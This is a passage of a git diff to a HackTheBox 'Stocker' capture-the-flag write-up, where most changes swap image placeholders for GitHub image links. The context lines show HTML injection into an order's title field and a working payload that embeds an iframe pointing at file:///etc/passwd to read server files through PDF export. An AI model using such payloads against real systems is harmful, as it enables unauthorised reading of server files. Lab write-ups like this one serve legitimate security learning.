@@ -55,13 +55,13 @@ It has just two ports open 22 and 80. Let's start by adding the domain name to o
 
 And now visit the page
 
-IMG1
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Stocker/images/IMG1.png?raw=true)
 
 The page looks static. We can try visiting stocker.htb/index.html and hovering over links shows directories with #.
 
 So now let's move on to `dev.stocker.htb`:
 
-IMG2
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Stocker/images/IMG2.png?raw=true)
 
 Looking at the burp with response of the site we can get this info:
 
@@ -102,6 +102,9 @@ Upgrade-Insecure-Requests: 1
 
 And we're successfully in. There is a functionality to export order to pdf.
 
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Stocker/images/IMG3.png?raw=true)
+
+
 ```
 POST /api/order HTTP/1.1
 Host: dev.stocker.htb
@@ -119,7 +122,7 @@ Cookie: connect.sid=s%3AzZ5bv6pSMJi52yO9jH3sIliGNK5DfAnO.F%2BmMLf09fnL7xSjIcDNgx
 {"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<h1>test</h1>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
 ```
 
-IMG4
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Stocker/images/IMG4.png?raw=true)
 
 We see that we have xss. 
 
@@ -146,7 +149,7 @@ This doesn't work because we need to escape " character:
 {"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<iframe src=\"file:///etc/passwd\" width=\"1000\" height=\"1000\">","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
 ```
 
-IMG5
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Stocker/images/IMG5.png?raw=true)
 
 We can note that there is user angoose.
 When I did walkthrough through this box i crash it while tampering the request which returned this response:
